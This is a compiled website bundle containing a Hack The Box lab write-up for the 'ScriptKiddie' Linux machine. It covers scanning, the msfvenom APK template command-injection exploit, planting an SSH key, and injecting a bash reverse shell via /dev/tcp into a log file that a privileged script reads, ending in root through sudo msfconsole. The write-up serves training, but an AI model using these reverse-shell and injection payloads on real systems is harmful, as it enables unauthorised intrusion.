"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9845],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>h});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function i(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?i(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):i(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)t=i[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var s=r.createContext({}),p=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},d=function(e){var n=p(e.components);return r.createElement(s.Provider,{value:n},e.children)},m="mdxType",c={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,i=e.originalType,s=e.parentName,d=l(e,["components","mdxType","originalType","parentName"]),m=p(t),u=a,h=m["".concat(s,".").concat(u)]||m[u]||c[u]||i;return t?r.createElement(h,o(o({ref:n},d),{},{components:t})):r.createElement(h,o({ref:n},d))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var i=t.length,o=new Array(i);o[0]=u;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[m]="string"==typeof e?e:a,o[1]=l;for(var p=2;p<i;p++)o[p]=t[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},2658:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>o,default:()=>c,frontMatter:()=>i,metadata:()=>l,toc:()=>p});var r=t(87462),a=(t(67294),t(3905));const i={layout:"post",title:"ScriptKiddie ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","python","web"],date:"2021/06/06 15:15:00",thumbnail:"/img/HackTheBox/scriptkiddie.png",toc:!0},o="Information",l={unversionedId:"HackTheBox/ScriptKiddie/write-up",id:"HackTheBox/ScriptKiddie/write-up",title:"ScriptKiddie ",description:"- Name: ScriptKiddie",source:"@site/writeups/HackTheBox/ScriptKiddie/write-up.md",sourceDirName:"HackTheBox/ScriptKiddie",slug:"/HackTheBox/ScriptKiddie/write-up",permalink:"/writeups/HackTheBox/ScriptKiddie/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"python",permalink:"/writeups/tags/python"},{label:"web",permalink:"/writeups/tags/web"}],version:"current",frontMatter:{layout:"post",title:"ScriptKiddie ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","python","web"],date:"2021/06/06 15:15:00",thumbnail:"/img/HackTheBox/scriptkiddie.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Remote ",permalink:"/writeups/HackTheBox/Remote/write-up"},next:{title:"ServMon ",permalink:"/writeups/HackTheBox/ServMon/write-up"}},s={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web exploitation",id:"web-exploitation",level:2},{value:"System exploitation",id:"system-exploitation",level:2},{value:"Privilege Escalation of Machine : from kid to pwn",id:"privilege-escalation-of-machine--from-kid-to-pwn",level:2},{value:"Privilege Escalation of Machine : from pwn to root",id:"privilege-escalation-of-machine--from-pwn-to-root",level:2}],d={toc:p},m="wrapper";function c(e){let{components:n,...i}=e;return(0,a.kt)(m,(0,r.Z)({},d,i,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"information"},"Information"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," ScriptKiddie"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://app.hackthebox.eu/machines/314"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 20")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"ScriptKiddie",src:t(63300).Z,width:"598",height:"381"})),(0,a.kt)("h2",{id:"overview"},"Overview"),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap metasploit pwncat\n")),(0,a.kt)("p",null,"Note: IP is different because of release arena (10.10.10.226)"),(0,a.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,a.kt)("p",null,"Port and service scan with nmap:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"# Nmap 7.91 scan initiated Mon Feb  8 19:00:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.129.77.135\nNmap scan report for 10.129.77.135\nHost is up (0.029s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)\n|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)\n|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)\n5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)\n| http-methods:\n|_  Supported Methods: POST HEAD GET OPTIONS\n|_http-title: k1d'5 h4ck3r t00l5\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Mon Feb  8 19:00:54 2021 -- 1 IP address (1 host up) scanned in 25.42 seconds\n")),(0,a.kt)("h2",{id:"web-exploitation"},"Web exploitation"),(0,a.kt)("p",null,"A python web server (Werkzeug) is running at ",(0,a.kt)("a",{parentName:"p",href:"http://10.129.77.135:5000/"},"http://10.129.77.135:5000/"),"."),(0,a.kt)("p",null,"The page is named ",(0,a.kt)("inlineCode",{parentName:"p"},"k1d'5 h4ck3r t00l5")," and allow us to use some commands:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"nmap: nmap"),(0,a.kt)("li",{parentName:"ul"},"payloads: msfvenom from metasploit"),(0,a.kt)("li",{parentName:"ul"},"sploits: searchploit from exploit-db")),(0,a.kt)("p",null,"On the msfvenom, we have the option to upload a custom template."),(0,a.kt)("p",null,"But there is a new vulnerability:"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"This module exploits a command injection vulnerability in Metasploit\nFramework's msfvenom payload generator when using a crafted APK file\nas an Android payload template. Affects Metasploit Framework <=\n6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this\nmodule is a relatively empty yet valid-enough APK file. To trigger\nthe vulnerability, the victim user should do the following: msfvenom\n-p android/<...> -x <crafted_file.apk>")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options\n\nModule options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   FILENAME  msf.apk          yes       The APK file name\n\n\nPayload options (cmd/unix/reverse_netcat):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  tun0             yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n   **DisablePayloadHandler: True   (no handler will be created!)**\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run\n\n[+] msf.apk stored at /home/cyfun/.msf4/local/msf.apk\n")),(0,a.kt)("p",null,"Then we select ",(0,a.kt)("inlineCode",{parentName:"p"},"android"),", specify our template and set whatever a lhost."),(0,a.kt)("p",null,"On our machine we just launch a listener:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ pwncat -l 4444 -vv\nINFO: Listening on :::4444 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:4444 (family 2/IPv4, TCP)\nINFO: Client connected from 10.129.77.135:43478 (family 2/IPv4, TCP)\nid\nuid=1000(kid) gid=1000(kid) groups=1000(kid)\n")),(0,a.kt)("h2",{id:"system-exploitation"},"System exploitation"),(0,a.kt)("p",null,"Let's see where we are and locate the flag:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ ls -lhA\ntotal 20K\ndrwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 __pycache__\n-rw-rw-r-- 1 kid kid 4.4K Feb  3 11:03 app.py\ndrwxrwxr-x 3 kid kid 4.0K Feb  3 07:40 static\ndrwxrwxr-x 2 kid kid 4.0K Feb  3 07:40 templates\n\n$ pwd\n/home/kid/html\n\n$ ls -lhA ..\ntotal 52K\nlrwxrwxrwx 1 root kid    9 Jan  5 20:31 .bash_history -> /dev/null\n-rw-r--r-- 1 kid  kid  220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 kid  kid 3.7K Feb 25  2020 .bashrc\ndrwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .bundle\ndrwx------ 2 kid  kid 4.0K Feb  3 07:40 .cache\ndrwx------ 4 kid  kid 4.0K Feb  3 11:49 .gnupg\ndrwxrwxr-x 3 kid  kid 4.0K Feb  3 07:40 .local\ndrwxr-xr-x 9 kid  kid 4.0K Feb  3 07:40 .msf4\n-rw-r--r-- 1 kid  kid  807 Feb 25  2020 .profile\ndrwx------ 2 kid  kid 4.0K Feb  3 07:40 .ssh\n-rw-r--r-- 1 kid  kid    0 Jan  5 11:10 .sudo_as_admin_successful\ndrwxrwxr-x 5 kid  kid 4.0K Feb  3 11:03 html\ndrwxrwxrwx 2 kid  kid 4.0K Feb  3 07:40 logs\ndrwxr-xr-x 3 kid  kid 4.0K Feb  3 11:48 snap\n-r-------- 1 kid  kid   33 Jan  5 20:45 user.txt\n\n$ cat ../user.txt # /home/kid/user.txt\n4cbc*************************08a\n\n")),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-kid-to-pwn"},"Privilege Escalation of Machine : from kid to pwn"),(0,a.kt)("p",null,"Let's find if there is another user flag:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"kid@scriptkiddie:~$ find / -name user.txt -type f 2>/dev/null\n/home/kid/user.txt\n")),(0,a.kt)("p",null,"No there isn't. But we can loot kid's private key to have a better shell."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ chmod 600 id_rsa_kid\n$ ssh kid@10.129.77.135 -i id_rsa_kid\n")),(0,a.kt)("p",null,"Note: has been patched, there is no longer some ssh key but we can add ours:\n",(0,a.kt)("inlineCode",{parentName:"p"},"printf %s 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' >> /home/kid/.ssh/authorized_keys"),"."),(0,a.kt)("p",null,"There is another user named ",(0,a.kt)("inlineCode",{parentName:"p"},"pwn")," owning a script: ",(0,a.kt)("inlineCode",{parentName:"p"},"/home/pwn/scanlosers.sh"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},"#!/bin/bash\n\nlog=/home/kid/logs/hackers\n\ncd /home/pwn/\ncat $log | cut -d' ' -f3- | sort -u | while read ip; do\n    sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null\" &\ndone\n\nif [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi\n")),(0,a.kt)("p",null,"We have write access to ",(0,a.kt)("inlineCode",{parentName:"p"},"/home/kid/logs/hackers"),". We can see that our date and\nIP is written to this file when we try to bypass the searchploit function:"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/home/kid/html/app.py")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"import datetime\nimport os\nimport random\nimport re\nimport subprocess\nimport tempfile\nimport time\nfrom flask import Flask, render_template, request\nfrom hashlib import md5\nfrom werkzeug.utils import secure_filename\n\n\nregex_ip = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')\nregex_alphanum = re.compile(r'^[A-Za-z0-9 \\.]+$')\nOS_2_EXT = {'windows': 'exe', 'linux': 'elf', 'android': 'apk'}\n\napp = Flask(__name__)\n\n\n@app.route('/', methods=['GET','POST'])\ndef index():\n    if request.method == 'GET' or not 'action' in request.form:\n        return render_template('index.html')\n    elif request.form['action'] == 'scan':\n        return scan(request.form['ip'])\n    elif request.form['action'] == 'generate':\n        return venom(request)\n    elif request.form['action'] == 'searchsploit':\n        return searchsploit(request.form['search'], request.remote_addr)\n    print(\"no valid action\")\n    return request.form\n\n\ndef scan(ip):\n    if regex_ip.match(ip):\n        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):\n            stime = random.randint(200,400)/100\n            time.sleep(stime)\n            result = f\"\"\"Starting Nmap 7.80 ( https://nmap.org ) at {datetime.datetime.utcnow().strftime(\"%Y-%m-%d %H:%M\")} UTC\\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds\"\"\".encode()\n        else:\n            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])\n        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))\n    return render_template('index.html', scanerror=\"invalid ip\")\n\n\ndef searchsploit(text, srcip):\n    if regex_alphanum.match(text):\n        result = subprocess.check_output(['searchsploit', '--color', text])\n        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))\n    else:\n        with open('/home/kid/logs/hackers', 'a') as f:\n            f.write(f'[{datetime.datetime.now()}] {srcip}\\n')\n        return render_template('index.html', sserror=\"stop hacking me - well hack you back\")\n\n\ndef venom(request):\n    errors = []\n    file = None\n    if not 'lhost' in request.form:\n        errors.append('lhost missing')\n    else:\n        lhost = request.form['lhost']\n        if not regex_ip.match(lhost):\n            errors.append('invalid lhost ip')\n    if not 'os' in request.form:\n        errors.append('os missing')\n    else:\n        tar_os = request.form['os']\n        if tar_os not in ['windows', 'linux', 'android']:\n            errors.append(f'invalid os: {tar_os}')\n    if 'template' in request.files and request.files['template'].filename != '':\n        file = request.files['template']\n        if not ('.' in file.filename and file.filename.split('.')[-1] == OS_2_EXT[tar_os]):\n            errors.append(f'{tar_os} requires a {OS_2_EXT[tar_os]} ext template file')\n        else:\n            template_name = secure_filename(file.filename)\n            template_ext = file.filename.split('.')[-1]\n            template_file = tempfile.NamedTemporaryFile('wb', suffix='.'+template_ext)\n            file.save(template_file.name)\n    else:\n        template_name = \"None\"\n\n    if errors:\n        return render_template('index.html', payloaderror='<br/>\\n'.join(errors))\n\n    payload = f'{tar_os}/meterpreter/reverse_tcp'\n    outfilename = md5(request.remote_addr.encode()).hexdigest()[:12] + '.' + OS_2_EXT[tar_os]\n    outfilepath = os.path.join(app.root_path, 'static', 'payloads', outfilename)\n\n    try:\n        if file:\n            print(f'msfvenom -x {template_file.name} -p {payload} LHOST={lhost} LPORT=4444')\n            result = subprocess.check_output(['msfvenom', '-x', template_file.name, '-p',\n                payload, f'LHOST={lhost}', 'LPORT=4444',\n                '-o', outfilepath])\n            template_file.close()\n        else:\n            result = subprocess.check_output(['msfvenom', '-p', payload,\n                f'LHOST={lhost}', 'LPORT=4444', '-o', outfilepath])\n    except subprocess.CalledProcessError:\n        return render_template('index.html', payloaderror=\"Something went wrong\")\n\n\n    return render_template('index.html', payload=payload, lhost=lhost,\n            lport=4444, template=template_name, fn=outfilename)\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0')\n")),(0,a.kt)("p",null,"So normally ",(0,a.kt)("inlineCode",{parentName:"p"},"/home/pwn/scanlosers.sh")," will scan us back."),(0,a.kt)("p",null,"The logs file should contains lines like this one:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"2021-02-08 19:54:33.513581 1.1.1.1\n")),(0,a.kt)("p",null,'And when we try to "hack" searchploit, it voids the file instead of appending a\nnew line.'),(0,a.kt)("p",null,"There is ",(0,a.kt)("inlineCode",{parentName:"p"},"/usr/sbin/incrond")," running so there is maybe a root job starting\n",(0,a.kt)("inlineCode",{parentName:"p"},"/home/pwn/scanlosers.sh")," or something similar."),(0,a.kt)("p",null,"Let's upload and launch pspy to confirm that."),(0,a.kt)("p",null,"On our machine:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64\n$ ruby -run -ehttpd . -p8080\n")),(0,a.kt)("p",null,"On the target machine:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"kid@scriptkiddie:~$ wget http://10.10.14.135:8080/pspy64\nkid@scriptkiddie:~$ chmod u+x pspy64\nkid@scriptkiddie:~$ ./pspy64\n")),(0,a.kt)("p",null,"If we go trigger the searchsploit security filter we can see this on pspy:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"2021/02/08 21:30:37 CMD: UID=1001 PID=2221   | /bin/bash /home/pwn/scanlosers.sh \n2021/02/08 21:30:37 CMD: UID=1001 PID=2225   | /bin/bash /home/pwn/scanlosers.sh \n2021/02/08 21:30:37 CMD: UID=1001 PID=2226   | sh -c nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2>&1 >/dev/null \n2021/02/08 21:30:37 CMD: UID=1001 PID=2228   | nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 \n2021/02/08 21:30:37 CMD: UID=1001 PID=2231   | /bin/bash /home/pwn/scanlosers.sh \n2021/02/08 21:30:37 CMD: UID=1001 PID=2237   | /bin/bash /home/pwn/scanlosers.sh \n2021/02/08 21:30:37 CMD: UID=1001 PID=2236   | /bin/bash /home/pwn/scanlosers.sh \n2021/02/08 21:30:37 CMD: UID=0    PID=2238   | /lib/systemd/systemd-udevd \n2021/02/08 21:30:48 CMD: UID=0    PID=2239   | /usr/sbin/incrond \n2021/02/08 21:30:48 CMD: UID=1001 PID=2240   | sed -i s/open  /closed/g /home/pwn/recon/sed6xfScv \n2021/02/08 21:30:48 CMD: UID=0    PID=2241   | /bin/sh /sbin/dhclient-script \n2021/02/08 21:30:48 CMD: UID=???  PID=2243   | ???\n")),(0,a.kt)("p",null,"1001 is the id of ",(0,a.kt)("inlineCode",{parentName:"p"},"pwn"),", so we'll get a shell as pwn."),(0,a.kt)("p",null,"Let's craft a reverse shell payload and put it in place:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ printf %s \"cyfun cyfun ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/9999 0>&1' #\" > /home/kid/logs/hackers\n")),(0,a.kt)("p",null,"Note: respect the log format else the ",(0,a.kt)("inlineCode",{parentName:"p"},"cut")," in the script will fails to parse"),(0,a.kt)("p",null,"Once injected in ",(0,a.kt)("inlineCode",{parentName:"p"},"/home/pwn/scanlosers.sh")," the command executed by pwn incron\njob will be:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"nmap --top-ports 10 -oN recon/ ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/9999 0>&1' #.nmap  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/9999 0>&1' # 2>&1 >/dev/null\n")),(0,a.kt)("p",null,"Then we start a listener ",(0,a.kt)("inlineCode",{parentName:"p"},"pwncat -l 9999 -vv"),"."),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-pwn-to-root"},"Privilege Escalation of Machine : from pwn to root"),(0,a.kt)("p",null,"We can root ",(0,a.kt)("inlineCode",{parentName:"p"},"msfconsole")," as root."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"pwn@scriptkiddie:~$ sudo -l\nMatching Defaults entries for pwn on scriptkiddie:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser pwn may run the following commands on scriptkiddie:\n    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole\n")),(0,a.kt)("p",null,"It will be EZ because we it's an interpretter where we can directly pass\nsystem commands or open ",(0,a.kt)("inlineCode",{parentName:"p"},"irb")," ruby interpreter."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"msf6 > cat /root/root.txt\nstty: 'standard input': Inappropriate ioctl for device\n[*] exec: cat /root/root.txt\n\n40aa*********************75f\n")))}c.isMDXComponent=!0},63300:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/scriptkiddie-e0231856a9eee36162549c3e68cfeb29.png"}}]);